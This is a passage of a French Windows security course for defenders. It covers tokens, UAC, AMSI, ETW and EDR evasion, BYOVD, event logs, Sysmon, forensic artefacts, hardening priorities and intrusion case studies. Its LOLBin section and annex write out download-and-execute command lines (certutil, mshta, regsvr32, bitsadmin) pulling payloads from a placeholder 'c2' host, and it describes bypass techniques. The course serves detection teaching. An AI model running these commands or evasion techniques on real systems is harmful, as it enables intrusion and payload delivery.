Le SRM vérifie chaque accès : il compare le **token d'accès** du processus (SID de l'utilisateur, SIDs des groupes, privilèges) avec la **DACL** de l'objet (liste d'ACE Allow/Deny). Les tokens sont créés au logon et ne changent pas pendant la session. L'**impersonation** (un thread adopte temporairement l'identité d'un autre utilisateur — niveaux : Anonymous, Identification, Impersonation, Delegation).

##### 17.2 Mandatory Integrity Control (MIC)

Niveaux d'intégrité : Untrusted, Low (navigateur sandboxé), Medium (processus utilisateur standard), High (processus élevé/admin), System (services), Protected Process. Un processus ne peut PAS écrire dans un objet d'intégrité supérieure — un processus Medium ne peut pas modifier un objet High.

##### 17.3 UAC (User Account Control)

Un admin a deux tokens : un Medium (filtré) et un High (élevé). L'élévation demande le consentement (prompt UAC). Le **bypass UAC** obtient le token High sans le prompt — techniques : fodhelper.exe, eventvwr.exe (auto-elevation via registre), COM elevation moniker. Détection : Sysmon 1 avec les binaires d'auto-elevation comme parent + modification de registre Sysmon 13.

##### 17.4 Mitigations mémoire et code

*Les protections modernes qui rendent l'exploitation de vulnérabilités et l'injection de code plus difficiles.*

**DEP** (Data Execution Prevention — empêche l'exécution de code dans les pages mémoire marquées « données » — le shellcode classique dans le heap ne peut plus s'exécuter directement). **ASLR** (Address Space Layout Randomization — randomise les adresses de chargement des DLLs et de l'exécutable — l'attaquant ne peut plus prédire les adresses pour ses gadgets ROP). **CFG** (Control Flow Guard — vérifie que les appels de fonctions indirects ciblent des adresses valides — protection contre le détournement du flux d'exécution). **CET** (Control-flow Enforcement Technology — Intel hardware, shadow stack — détecte la corruption de la pile par les exploits ROP/JOP). **ACG** (Arbitrary Code Guard — empêche un processus de générer du code dynamique — bloque la modification de pages mémoire en exécutable après allocation). **CIG** (Code Integrity Guard — empêche le chargement de DLLs non signées par Microsoft). **HVCI** (Hypervisor-Protected Code Integrity — utilise l'hyperviseur pour vérifier l'intégrité du code kernel — empêche le chargement de drivers non signés même avec admin ; fait partie de **VBS** — Virtualization-Based Security).

Ces mitigations se cumulent en couches — un exploit moderne doit contourner DEP (ROP), ASLR (info leak), CFG (appels indirects vérifiés), CET (shadow stack), et potentiellement HVCI. Chaque couche rend l'exploitation plus coûteuse pour l'attaquant.

---

#### Chapitre 18 — Authentification locale et domaine

L'authentification locale : winlogon.exe → LogonUI → lsass.exe → SAM. L'authentification domaine : winlogon.exe → lsass.exe → Kerberos ou NTLM vers le DC (renvoi cours AD Ch.5-6). La **LSA** (Local Security Authority — le sous-système qui orchestre l'authentification ; les Security Packages — Negotiate, Kerberos, NTLM, WDigest, CredSSP ; un **SSP malveillant** peut être injecté dans lsass pour capturer les credentials — enregistrement via la clé registre Security Packages, détection : Sysmon 13 + 7). L'authentification par certificat (smart card, Windows Hello — PKINIT). Le **Credential Provider** (l'interface entre le logon screen et la LSA — les credential providers custom sont un vecteur de persistence rare mais discret).

---

#### Chapitre 19 — Privilèges, élévation et contrôle d'exécution

Les **privilèges Windows** critiques : **SeDebugPrivilege** (accéder à la mémoire de tout processus → Mimikatz), **SeImpersonatePrivilege** (impersonation → Potato attacks), **SeBackupPrivilege** (lire tout fichier y compris SAM/NTDS.dit), **SeRestorePrivilege** (écrire tout fichier), **SeTcbPrivilege** (agir comme le système), **SeLoadDriverPrivilege** (charger un driver kernel). L'**élévation de privilèges** Potato (exploitent SeImpersonatePrivilege pour obtenir SYSTEM via la coercion NTLM interne — PrintSpoofer, GodPotato, JuicyPotato, SweetPotato ; détection : 4672 avec SeImpersonatePrivilege + processus inhabituel).

Le **contrôle d'exécution** : **AppLocker** (règles par path, hash, publisher → contournable mais ralentit l'attaquant — bypass via LOLBins, DLL side-loading), **WDAC** (Windows Defender Application Control — plus robuste, basé sur la politique code integrity du kernel, plus difficile à contourner que AppLocker), **SRP** (Software Restriction Policies — legacy, remplacé par AppLocker/WDAC).

---

#### Chapitre 20 — Détection moderne : AMSI, ETW, EDR et BYOVD

##### 20.1 AMSI (Anti-Malware Scan Interface)

AMSI est l'interface qui permet à PowerShell, VBA, JavaScript, .NET, et WSH de soumettre le code au moteur antimalware AVANT exécution. Quand un script PowerShell s'exécute, chaque bloc de code est passé à AMSI → l'AV le scanne → autorisation ou blocage. Les attaquants **patachent amsi.dll en mémoire** pour désactiver le scan (le champ amsiInitFailed est mis à $true, ou les instructions de AmsiScanBuffer sont remplacées par un retour immédiat). Détection : Script Block Logging (Event 4104) capture le code APRÈS le bypass AMSI (le bypass est lui-même loggé), ETW peut détecter le patching.

##### 20.2 ETW (Event Tracing for Windows)

ETW est le mécanisme de trace universel de Windows. Les **providers** ETW génèrent des événements. Les **consumers** consomment ces événements — Event Logs, Sysmon, et les EDR sont des consumers ETW. Le provider **Microsoft-Windows-Threat-Intelligence** est utilisé par les EDR pour détecter les injections de code (il enregistre les opérations sur la mémoire de processus distants — WriteProcessMemory, NtMapViewOfSection). Les attaquants avancés **désactivent ou contournent les providers ETW** (patching des structures ETW en mémoire, NtTraceControl abuse). Détection : monitoring de la configuration ETW (Event 11 Sysmon sur les fichiers ETW, vérification de l'intégrité des providers).

##### 20.3 EDR (Endpoint Detection and Response)

Comment les EDR fonctionnent : **hooking user mode** (les EDR remplacent les premières instructions des fonctions ntdll.dll par un JMP vers leur DLL de monitoring → chaque appel API suspect est intercepté et analysé), **callbacks kernel** (PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine — le driver EDR est notifié à chaque création de processus et chargement d'image), **ETW consumption** (le driver EDR consomme les événements du provider Threat-Intelligence), **minifilter drivers** (interception des opérations I/O pour scanner les fichiers). Comment les EDR sont contournés : **unhooking** (restaurer les bytes originaux de ntdll.dll pour supprimer les hooks EDR), **syscalls directs** (sauter ntdll.dll entièrement → les hooks ne sont jamais traversés), **BYOVD** (voir ci-dessous), et **ETW patching** (désactiver les providers ETW qui alimentent l'EDR).

##### 20.4 BYOVD (Bring Your Own Vulnerable Driver)

*Une technique moderne majeure qui mérite une attention particulière.*

Le **BYOVD** consiste à charger un driver légitime mais vulnérable (un ancien driver signé par un éditeur reconnu — Dell, Intel, HP, Realtek — qui contient une vulnérabilité connue) pour obtenir un accès kernel. Une fois en kernel mode, l'attaquant peut : désactiver l'EDR (tuer le processus EDR, désactiver les callbacks kernel, supprimer les hooks), désactiver la protection de lsass (accéder à la mémoire de lsass même avec RunAsPPL), et charger un rootkit. Le driver est légitime et signé → il passe le driver signing enforcement. Exemples : gdrv.sys (Gigabyte), procexp.sys (Process Explorer — le driver du propre outil Sysinternals a été abusé), dbutil_2_3.sys (Dell).

La défense : **HVCI** (Hypervisor-Protected Code Integrity — vérifie l'intégrité du code kernel et peut bloquer les drivers vulnérables connus), les **Microsoft Vulnerable Driver Blocklist** (liste de drivers vulnérables bloqués par Windows), **WDAC** avec blocage de drivers spécifiques, et le monitoring (Event 7045 chargement de driver, Sysmon 6 — DriverLoaded — hash du driver → comparaison avec la liste des drivers vulnérables connus).

---

### PARTIE VI — EVENT LOGS, ARTEFACTS ET FORENSIC

---

#### Chapitre 21 — Event Logs Windows

L'architecture Event Logs (EVTX — format XML binaire, C:\Windows\System32\winevt\Logs). Les journaux principaux : Security, System, Application, PowerShell (Microsoft-Windows-PowerShell/Operational), Sysmon (Microsoft-Windows-Sysmon/Operational). Les **Event IDs critiques** : 4624 (logon succès — types 2 interactif/3 réseau/7 unlock/10 RDP), 4625 (échec), 4648 (explicit credentials), 4672 (special privileges), 4688 (process creation — avec command line si audit configuré), 4698 (scheduled task créée), 4720 (account created), 7045 (service installé), 1102 (audit log cleared — effacement de logs = alerte).

L'**Advanced Audit Policy** (les catégories à activer : Account Logon, Logon/Logoff, Object Access, Process Tracking avec command line, Detailed Tracking). Le **command line logging** (GPO : Audit Process Creation + Include command line in process creation events — indispensable pour voir les arguments des processus — sans command line, l'Event 4688 ne montre que le nom de l'exe, pas ce qu'il fait). Les limites : la taille par défaut des journaux est insuffisante (les logs anciens sont écrasés), un attaquant peut effacer les logs (Event 1102 signale l'effacement → centraliser vers le SIEM).

---

#### Chapitre 22 — Sysmon et télémétrie avancée

**Sysmon** (System Monitor — outil Sysinternals qui génère une télémétrie riche). Les Event IDs essentiels : **1** (Process Creation — hash, command line, parent, user — le plus utilisé), **3** (Network Connection — processus + IP + port destination), **7** (Image Loaded — DLL chargée), **8** (CreateRemoteThread — injection de code), **10** (Process Access — accès mémoire d'un autre processus → lsass.exe), **11** (File Created), **12/13/14** (Registry events), **19/20/21** (WMI events — persistence), **22** (DNS Query — domaines résolus par processus), **25** (Process Tampering — image hollowing).

La **configuration** (fichier XML — détermine ce qui est loggé ; **SwiftOnSecurity/sysmon-config** est la baseline communautaire de référence ; la configuration doit être adaptée — trop de bruit = logs inutiles, pas assez = angles morts). Le déploiement (GPO ou SCCM/Intune, Sysmon est un driver minifilter → résistant à la désinstallation sans droits admin, mais contournable par BYOVD — Ch.20). La complémentarité avec les Event Logs natifs (Sysmon Event 1 est plus riche que Event 4688 — il inclut le hash du processus, le parent, et la command line nativement).

---

#### Chapitre 23 — Artefacts forensic : exécution et persistence

Les artefacts d'**exécution** — chacun répond à « ce programme a-t-il été exécuté ? » : **Prefetch** (C:\Windows\Prefetch — timestamps création=1ère exéc/modification=dernière, run count, fichiers accédés — PECmd ; 128 fichiers max sur Win10/11), **Amcache** (Amcache.hve — chemin, hash SHA-1, éditeur, version, timestamp — AmcacheParser), **ShimCache/AppCompatCache** (registre SYSTEM — chemin, taille, timestamp modification — sur Win10+, présence ≠ exécution certaine — AppCompatCacheParser), **BAM/DAM** (registre SYSTEM — chemin exe + timestamp par utilisateur, ~7 jours — Win10 1709+), **UserAssist** (HKCU — programmes lancés via Explorer, encodé ROT13, run count, timestamps), **SRUM** (SRUDB.dat — utilisation CPU, réseau, énergie par application, 30-60 jours).

Les artefacts de **persistence** : registre (Run, RunOnce, Services, Winlogon, AppInit_DLLs, IFEO, COM CLSID), fichiers (Scheduled Tasks dans C:\Windows\System32\Tasks, Startup folders), WMI (Event Subscriptions — FilterToConsumerBindings), BITS (transferts persistants). **Autoruns** (Sysinternals) = l'outil n°1 pour le triage de persistence — il liste TOUS ces mécanismes en un clic.

---

#### Chapitre 24 — Artefacts forensic : fichiers, réseau et mémoire

Les artefacts **fichiers** : **$MFT** (tous les fichiers existants et récemment supprimés, timestamps, taille — MFTECmd), **$UsnJrnl** (journal des modifications — MFTECmd), **LNK** (raccourcis — fichiers accédés, chemins, timestamps, volume serial — LECmd), **Jump Lists** (fichiers récents par application — JLECmd), **Shellbags** (dossiers navigués dans Explorer, même supprimés — ShellBagsExplorer), **Recycle Bin** ($I = métadonnées, $R = contenu — RBCmd), **Zone.Identifier** (ADS — Mark of the Web, source de téléchargement — Streams, Get-Content -Stream).

Les artefacts **réseau** : DNS cache (volatil — ipconfig /displaydns), SRUM données réseau, NetworkList/Profiles (historique des réseaux WiFi). Les artefacts **navigateur** (Chrome/Edge/Firefox — History, Downloads, Cookies, Cache — bases SQLite — Hindsight pour Chrome). Les artefacts **mémoire** (dump RAM — processus cachés, connexions actives, credentials en mémoire, code injecté, commandes — WinPMem, DumpIt pour la capture ; Volatility 3 pour l'analyse — Ch.30).

---

#### Chapitre 25 — Investigation Windows : méthodologie structurée

Les 5 étapes : (1) **Préservation** (image disque bit-à-bit — FTK Imager, dump mémoire si machine allumée — WinPMem/DumpIt, hash d'intégrité SHA-256, chaîne de custody — ne jamais travailler sur l'original), (2) **Triage rapide** (les 10 premières minutes — Autoruns, Process Explorer, netstat, Get-ScheduledTask, services récents 7045 — la machine est-elle compromise et par quoi ?), (3) **Timeline** (fusionner Event Logs + Prefetch + Amcache + $UsnJrnl + ShimCache + LNK → Timeline Explorer — Eric Zimmerman), (4) **Analyse en profondeur** (suivre chaque piste de la timeline — d'où vient le fichier ? qui l'a exécuté ? quelles connexions ? quelle persistence ?), (5) **Conclusion et rapport** (IOCs, timeline, impact, vecteur initial, actions correctives).

Live forensics vs dead forensics (live = accès mémoire mais altère l'état ; dead = intégrité préservée mais pas de données volatiles ; bonne pratique : dump mémoire d'abord, image disque ensuite). Les outils : **KAPE** (collecte + parsing automatisé — triage rapide en minutes), **Velociraptor** (agent + serveur — triage à distance sur tout le parc, requêtes VQL), **Autopsy** (plateforme forensic complète — investigation disques).

---

#### Chapitre 26 — LOLBins, fileless et chaîne MotW→SmartScreen→ASR

##### 26.1 Les LOLBins (Living-off-the-Land Binaries)

Binaires Microsoft légitimes détournés pour exécuter du code malveillant : **certutil** (téléchargement + décodage base64 — certutil -urlcache -split -f http://c2/payload.dll), **mshta** (exécution de HTA/VBScript — mshta http://c2/payload.hta), **rundll32** (exécution de fonctions DLL — le vecteur du fil rouge), **regsvr32** (chargement de COM scriptlets depuis une URL — « Squiblydoo » — regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll), **bitsadmin** (téléchargement via BITS — bitsadmin /transfer job http://c2/payload.exe %TEMP%\payload.exe), **wmic** (exécution via WMI — wmic process call create "payload.exe"), **cmstp** (bypass UAC + exécution), **msiexec** (exécution de packages MSI depuis une URL). Chaque LOLBin a ses traces : Sysmon 1 avec la command line suspecte, Sysmon 3 si connexion réseau depuis un LOLBin.

##### 26.2 Les techniques fileless

Code exécuté uniquement en mémoire — jamais écrit sur le disque : PowerShell IEX (le code est téléchargé et exécuté en mémoire), .NET reflection (Assembly.Load charge du code .NET en mémoire), Reflective DLL Loading (Ch.9). Pas de hash fichier, pas de scan AV basé sur fichier → la détection repose sur le comportement (EDR), la journalisation (Script Block Logging capture le code PowerShell même fileless), et ETW.

##### 26.3 La chaîne de défense MotW → SmartScreen → Protected View → ASR

*Pour les attaques par phishing initial (le vecteur n°1), cette chaîne est le bloc défensif central de Windows.*

Le **Mark of the Web (MotW)** : quand un fichier est téléchargé depuis Internet ou reçu par email, Windows écrit un ADS Zone.Identifier contenant la source (ZoneId=3 = Internet). Ce marquage déclenche toute la chaîne suivante. **SmartScreen** : quand un fichier avec MotW est exécuté, SmartScreen vérifie la réputation du fichier (hash) et de l'URL source auprès de Microsoft → fichier inconnu ou malveillant = avertissement ou blocage. **Office Protected View** : quand un document Office avec MotW est ouvert, il s'ouvre en mode lecture seule (sandbox) — les macros ne s'exécutent PAS tant que l'utilisateur ne clique pas « Activer la modification ». **Macro restrictions** (GPO : bloquer les macros dans les documents provenant d'Internet — la mesure la plus efficace contre le phishing avec macro ; depuis 2022, Microsoft bloque par défaut les macros VBA dans les documents avec MotW). **ASR** (Attack Surface Reduction rules — Defender) : règles qui bloquent des comportements spécifiques même si le code s'exécute (bloquer les processus enfants de Office, bloquer les appels Win32 depuis les macros, bloquer l'exécution de scripts obfusqués, bloquer le téléchargement de contenu exécutable).

Les attaquants contournent la chaîne en **supprimant le MotW** (archives .zip/.rar qui ne préservent pas le MotW dans certaines versions, images disque .iso/.img qui ne marquent pas les fichiers extraits, contournements de SmartScreen — CVE-2023-36025, CVE-2024-21412). Chaque contournement de MotW est une CVE critique car il casse toute la chaîne de protection.

---

### PARTIE VII — HARDENING, CAS DE SYNTHÈSE ET RÉFÉRENCE

---

#### Chapitre 27 — Hardening Windows : P0 / P1 / P2

##### 27.1 P0 — Actions immédiates (semaine 1)

(1) Activer le command line logging (GPO Audit Process Creation + Include command line — sans ça, les Event 4688 sont aveugles). (2) Déployer Sysmon avec la config SwiftOnSecurity. (3) Centraliser les logs (WEF ou agent SIEM — les logs locaux sont effacés par l'attaquant). (4) Désactiver LLMNR + NBT-NS (GPO — bloque le poisoning Responder). (5) Désactiver SMBv1 (GPO — bloque EternalBlue). (6) Bloquer les macros Office dans les documents provenant d'Internet (GPO — la mesure anti-phishing la plus efficace). (7) Activer Script Block Logging PowerShell (GPO — la détection PowerShell n°1).

##### 27.2 P1 — Actions sous 3 mois

(8) Déployer LAPS (mot de passe admin local unique par machine). (9) Activer Credential Guard sur les machines compatibles (Enterprise, VBS capable). (10) Activer RunAsPPL sur lsass (GPO — protection contre le dump mémoire). (11) Activer SMB signing obligatoire (GPO — bloque le relay NTLM). (12) Configurer les ASR rules (Defender — bloquer les processus enfants de Office, bloquer les appels Win32 depuis macros). (13) Activer BitLocker sur tout le parc (protection offline). (14) Désactiver les protocoles legacy (WDigest — vérifier UseLogonCredential=0, NTLMv1 — désactiver).

##### 27.3 P2 — Actions à moyen terme (6 mois)

(15) Configurer AppLocker ou WDAC (contrôle d'exécution — seuls les binaires autorisés s'exécutent). (16) Activer HVCI (blocage des drivers non signés — protection BYOVD partielle). (17) Déployer la Microsoft Vulnerable Driver Blocklist. (18) Activer Transcription Logging PowerShell (complément au Script Block). (19) Configurer les restrictions de contenu exécutable téléchargeable (GPO + SmartScreen). (20) Auditer et supprimer les points de persistence inutiles (Autoruns — services, tâches, clés Run non nécessaires). (21) Mettre en place le monitoring des LOLBins (règles SIEM sur certutil, mshta, rundll32, regsvr32, bitsadmin avec command lines suspectes).

---

#### Chapitre 28 — Cas complet : investigation malware fileless (synthèse SHADOW)

Synthèse du fil rouge. L'investigation complète de Léa sur l'incident Valtec Industries.

**Phase 1 — Alerte et triage :** CrowdStrike détecte rundll32.exe enfant de winword.exe contactant une IP C2. Léa vérifie l'arbre (anormal — Ch.6), la command line (Sysmon 1 — rundll32 charge une DLL depuis %TEMP%), les connexions (Sysmon 3 — beaconing 60s vers 185.220.xxx.xxx:443).

**Phase 2 — Vecteur initial :** document Word piégé reçu par email. Zone.Identifier confirme la source (pièce jointe Outlook). La macro VBA (Event 4104 Script Block) : certutil télécharge une DLL → rundll32 l'exécute → injection en mémoire. La chaîne MotW→SmartScreen→Protected View a été contournée : le document était dans une archive .zip qui n'a pas préservé le MotW → Protected View ne s'est pas activé → la macro s'est exécutée directement. Les macros n'étaient pas bloquées par GPO (la mesure P0 n°6 aurait empêché l'attaque).

**Phase 3 — Payload et évasion :** la DLL utilise du Process Hollowing (Sysmon 25 — ProcessTampering) pour injecter du code dans svchost.exe. Le svchost creux contacte le C2 via HTTPS (Sysmon 3 + 22 DNS query). Un second stage est téléchargé via BITS. AMSI a été bypassé (patching amsi.dll — visible dans Script Block Logging Event 4104). Le payload n'a jamais touché le disque après l'injection (fileless — Ch.26).

**Phase 4 — Persistence :** scheduled task « WindowsUpdateCheck » (Event 4698), clé Run HKCU (Sysmon 13), WMI Event Subscription (Sysmon 19/20/21) — 3 mécanismes de persistence redondants.

**Phase 5 — Mouvement latéral :** dump lsass via comsvcs.dll (Sysmon 10 — accès lsass par rundll32 + comsvcs.dll en command line — un LOLBin classique). Credentials de l'admin IT récupérées (pas de Credential Guard — la mesure P1 n°9 aurait bloqué). WMI vers SRV-FILE01 (Event 4624 type 3 + 4688 wmiprvse.exe). PsExec vers SRV-APP02 (Event 7045 — PSEXESVC). DCSync depuis SRV-APP02 (Event 4662 — droits de réplication depuis non-DC → alerte critique).

**Timeline :** 09:12 email → 09:15 macro → 09:15 DLL téléchargée (certutil) → 09:16 process hollowing svchost → 09:17 C2 → 09:18 persistence (×3) → 09:25 dump lsass → 09:30 WMI latéral → 09:35 PsExec → 09:42 DCSync. **30 minutes du phishing au Domain Admin.**

**IOCs et recommandations :** hash DLL, IP C2, domaine DNS, clés de registre, noms de scheduled tasks. Recommandations priorisées : P0 — bloquer macros Internet (GPO), centraliser les logs AD CS ; P1 — Credential Guard, LAPS, ASR rules Office ; P2 — WDAC, HVCI. Le MotW bypass via archive .zip est le vecteur critique — recommandation : configurer la politique d'archivage pour propager le MotW (fonctionnalité Windows 11 22H2+).

---

#### Chapitre 29 — Cas complet : analyse d'un ransomware pré-détonation

Un fichier suspect intercepté par l'email gateway. Léa analyse en sandbox. **Analyse statique** (PE : entropy élevée = packing UPX, imports suspects — CryptEncrypt, FindFirstFileW, GetLogicalDriveStrings → probable ransomware, strings : note de rançon en anglais, extensions ciblées .docx .xlsx .pdf .pst, commande vssadmin delete shadows). **Analyse dynamique** en sandbox (dépackage UPX → imports réels visibles, exécution : création de mutex GlobalRansomLock, énumération des drives, chiffrement AES-256 fichier par fichier avec renommage en .locked, suppression des shadow copies via vssadmin, dépose de la note de rançon README_UNLOCK.txt dans chaque dossier). **Artefacts générés** : Sysmon 1 (process creation avec vssadmin delete shadows en child), Sysmon 11 (création de README_UNLOCK.txt dans de multiples dossiers — pattern détectable), Sysmon 13 (modification du registre — désactivation de la restauration système), Event 7045 (service créé pour la persistence). Le cas enseigne l'analyse PE (Ch.8), les mécanismes d'exécution (Ch.7), et comment construire des règles de détection avant la détonation.

---

#### Chapitre 30 — Cas complet : investigation mémoire avec Volatility

Un dump mémoire (RAM) réalisé sur une machine suspecte. Léa utilise **Volatility 3** : **windows.pslist** (lister les processus — un svchost.exe avec un PPID suspect, PID 8240, parent services.exe mais image path anormal), **windows.psscan** (scan des structures EPROCESS en mémoire — détecte les processus cachés/unlinkés par un rootkit — un processus invisible dans pslist mais présent dans psscan = rootkit), **windows.netscan** (connexions réseau — une connexion vers l'IP C2 depuis le PID 8240, confirmant le svchost creux), **windows.malfind** (sections mémoire RWX dans le svchost — code injecté détecté, signature de shellcode), **windows.cmdline** (commandes des processus — le svchost n'a pas d'argument -k attendu), **windows.hashdump** (hashes SAM), **windows.lsadump** (tickets Kerberos en mémoire). Le cas enseigne l'analyse mémoire comme compétence forensic complémentaire à l'analyse disque.

---

#### Chapitre 31 — Arbre de processus normal Windows : la référence de détection

*Ce chapitre est une référence — l'arbre de processus normal est le fondement de la détection basée sur le comportement.*

L'arbre complet avec, pour chaque processus : le parent attendu, le chemin attendu, le nombre d'instances attendu, l'utilisateur attendu, les arguments attendus, et les anomalies qui signalent une compromission.

**System** (PID 4, pas de parent, kernel mode, toujours présent — anomalie : PID ≠ 4). **smss.exe** (parent : System, chemin : %SystemRoot%\System32, 1 instance enfant de System — anomalie : parent ≠ System, chemin ≠ System32, instances multiples enfants de System). **csrss.exe** (parent : smss.exe devenu orphelin car smss se termine, chemin : System32, 2+ instances — anomalie : parent visible autre que smss orphelin). **wininit.exe** (parent : smss.exe orphelin, chemin : System32, 1 instance — anomalie : parent ≠ smss orphelin, instances multiples). **services.exe** (parent : wininit.exe, chemin : System32, 1 instance, utilisateur : SYSTEM — anomalie : parent ≠ wininit.exe, instances multiples, utilisateur ≠ SYSTEM). **svchost.exe** (parent : services.exe, chemin : System32, multiples instances, utilisateur : SYSTEM/LOCAL SERVICE/NETWORK SERVICE, **arguments : -k [nom_groupe]** — anomalies critiques : parent ≠ services.exe, chemin ≠ System32, pas d'argument -k, argument -k inhabituel, utilisateur ≠ SYSTEM/LOCAL/NETWORK SERVICE). **lsass.exe** (parent : wininit.exe, chemin : System32, **1 seule instance**, utilisateur : SYSTEM — anomalies critiques : parent ≠ wininit.exe, chemin ≠ System32, **2 instances = la seconde est probablement malveillante**, utilisateur ≠ SYSTEM). **winlogon.exe** (parent : smss.exe orphelin, chemin : System32, 1+ instances par session — anomalie : chemin ≠ System32). **explorer.exe** (parent : userinit.exe devenu orphelin, chemin : %SystemRoot%, 1 instance par session utilisateur — anomalie : parent autre que userinit orphelin, instances multiples pour un même utilisateur).

Les **cas courants de faux positifs** : Windows Update peut lancer des processus avec des parentés inhabituelles, les outils de management (SCCM, Intune) peuvent créer des processus enfants de services atypiques, et certains logiciels tiers légitimes ont des arbres de processus non standard → la baseline de l'environnement est indispensable pour réduire les faux positifs.

---

### ANNEXES

---

#### Annexe A — Cheat Sheet Windows

##### Triage rapide PowerShell

```powershell
# Processus
Get-Process | Sort-Object CPU -Descending | Select -First 20
Get-WmiObject Win32_Process | Select Name, ProcessId, ParentProcessId, CommandLine

# Services
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-WmiObject Win32_Service | Where {$_.StartMode -eq 'Auto'} | Select Name, DisplayName, PathName, StartName

# Scheduled Tasks
Get-ScheduledTask | Where {$_.State -eq 'Ready'} | Select TaskName, TaskPath, State

# Connexions réseau
Get-NetTCPConnection -State Established | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess

# Event Logs récents
Get-WinEvent -LogName Security -MaxEvents 50 | Where {$_.Id -in @(4624,4625,4672,4688,7045)}
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 50

# Registre - persistence
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

# Prefetch
Get-ChildItem C:\Windows\Prefetch -Filter *.pf | Sort LastWriteTime -Descending | Select -First 20

# Drivers chargés
driverquery /v /fo csv | ConvertFrom-Csv | Sort Status
```

##### Commandes CMD essentielles

```
netstat -anob                    # Connexions avec PID et binaire
tasklist /v                      # Processus avec détails
wmic process get name,processid,parentprocessid,commandline
sc query type= service state= all   # Tous les services
schtasks /query /fo LIST /v      # Tâches planifiées détaillées
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
systeminfo                       # Info système
```

---

#### Annexe B — Matrice Artefact / Ce qu'il prouve / Outil

| Artefact | Localisation | Ce qu'il prouve | Outil | Rétention |
|----------|-------------|----------------|-------|-----------|
| Prefetch | C:\Windows\Prefetch | Programme exécuté (timestamps, run count) | PECmd | 128 fichiers max |
| Amcache | Amcache.hve | Programme installé/exécuté (hash SHA-1) | AmcacheParser | Persistant |
| ShimCache | Registre SYSTEM | Fichier rencontré par l'OS (pas forcément exécuté Win10+) | AppCompatCacheParser | Persistant |
| BAM/DAM | Registre SYSTEM | Programme exécuté par utilisateur | RECmd | ~7 jours |
| UserAssist | HKCU | Programme lancé via Explorer (ROT13) | RECmd | Persistant |
| SRUM | SRUDB.dat | Utilisation CPU/réseau par application | SrumECmd | 30-60 jours |
| $MFT | Volume NTFS | Tous les fichiers (existants + supprimés récents) | MFTECmd | Tant que non écrasé |
| $UsnJrnl | Volume NTFS | Journal des modifications fichiers | MFTECmd | Variable (taille journal) |
| LNK | %APPDATA%\Recent | Fichiers accédés (chemins, timestamps) | LECmd | Persistant |
| Jump Lists | %APPDATA%\Recent\AutomaticDestinations | Fichiers récents par application | JLECmd | Persistant |
| Shellbags | NTUSER.DAT / UsrClass.dat | Dossiers navigués (même supprimés) | ShellBagsExplorer | Persistant |
| Recycle Bin | $Recycle.Bin | Fichiers supprimés ($I = méta, $R = contenu) | RBCmd | Jusqu'à vidage |
| Zone.Identifier | ADS du fichier | Source de téléchargement (MotW) | Streams / Get-Content -Stream | Tant que fichier existe |
| Event Logs | winevt\Logs | Activité système/sécurité/application | EvtxECmd, Get-WinEvent | Taille du journal |
| Registre | SAM/SECURITY/SOFTWARE/SYSTEM/NTUSER | Configuration, persistence, secrets | RECmd, Registry Explorer | Persistant |
| Mémoire RAM | Dump mémoire | Processus, connexions, credentials, code injecté | Volatility 3 | Volatil (live uniquement) |

---

#### Annexe C — Event IDs de référence

| Event ID | Source | Description | Pertinence sécurité |
|----------|--------|-------------|-------------------|
| 4624 | Security | Logon succès | Types 2/3/7/10 — source, compte, machine |
| 4625 | Security | Logon échec | Volume = brute force/spraying |
| 4648 | Security | Explicit credentials | Mouvement latéral potentiel |
| 4672 | Security | Special privileges | Escalade potentielle |
| 4688 | Security | Process creation | Avec command line = détection #1 |
| 4698 | Security | Scheduled task créée | Persistence |
| 4720 | Security | Account created | Compte créé par attaquant ? |
| 7045 | System | Service installé | PsExec, persistence |
| 1102 | Security | Audit log cleared | Effacement de logs = alerte |
| 4104 | PowerShell | Script Block | Code PowerShell désobfusqué |
| 4103 | PowerShell | Module Logging | Appels de modules |

---

#### Annexe D — Sysmon Event IDs

| Event ID | Description | Usage détection |
|----------|-------------|----------------|
| 1 | Process Creation | Command line, parent, hash — détection n°1 |
| 3 | Network Connection | Processus → IP:port — C2, mouvement latéral |
| 6 | Driver Loaded | Hash du driver — BYOVD detection |
| 7 | Image Loaded | DLL chargée dans un processus — DLL injection |
| 8 | CreateRemoteThread | Injection de code inter-processus |
| 10 | Process Access | Accès mémoire lsass.exe — credential dumping |
| 11 | File Created | Fichier créé — payload, persistence |
| 12/13/14 | Registry events | Création/modification/renommage de clés |
| 19/20/21 | WMI events | WMI persistence — FilterToConsumerBinding |
| 22 | DNS Query | Domaines résolus par processus — C2 domain |
| 25 | Process Tampering | Image file hollowing — Process Hollowing |

---

#### Annexe E — LOLBins : binaires détournables et détection

| LOLBin | Usage légitime | Usage offensif | Command line suspecte | Détection |
|--------|---------------|---------------|----------------------|-----------|
| certutil | Gestion de certificats | Téléchargement + décodage | -urlcache -split -f http:// | Sysmon 1 + 3 |
| mshta | Exécution HTA | Exécution de script distant | mshta http://... ou vbscript: | Sysmon 1 + 3 |
| rundll32 | Appel de fonctions DLL | Exécution de payload DLL | DLL dans %TEMP% ou URL | Sysmon 1 + 7 |
| regsvr32 | Enregistrement COM | Squiblydoo — script distant | /s /n /u /i:http://... | Sysmon 1 + 3 |
| bitsadmin | Transferts en arrière-plan | Téléchargement discret | /transfer /download http:// | Event BITS + Sysmon 1 |
| wmic | Administration WMI | Exécution à distance | process call create | Sysmon 1, 4688 |
| cmstp | Profils CM | Bypass UAC + exécution | /ni /s [fichier .inf] | Sysmon 1 |
| msiexec | Installation MSI | Exécution depuis URL | /q /i http://... | Sysmon 1 + 3 |
| powershell | Scripting/admin | Download + execute | -enc, IEX, -nop -w hidden | Event 4104 + Sysmon 1 |

---

#### Annexe F — Mapping de la bibliothèque

| Thématique | Cours principal | Cours complémentaires |
|-----------|----------------|----------------------|
| Windows internals (ce cours) | **Ce cours (Windows)** | — |
| Active Directory | **Cours AD** | Windows (Ch.11-12 credentials, Ch.18 authentification) |
| Détection SOC | **Cours SOC** | Windows (Ch.21-22 Event Logs/Sysmon, Ch.31 arbre de processus) |
| Incident Response | **Cours IR** | Windows (Ch.23-25 artefacts forensic, Ch.28 investigation complète) |
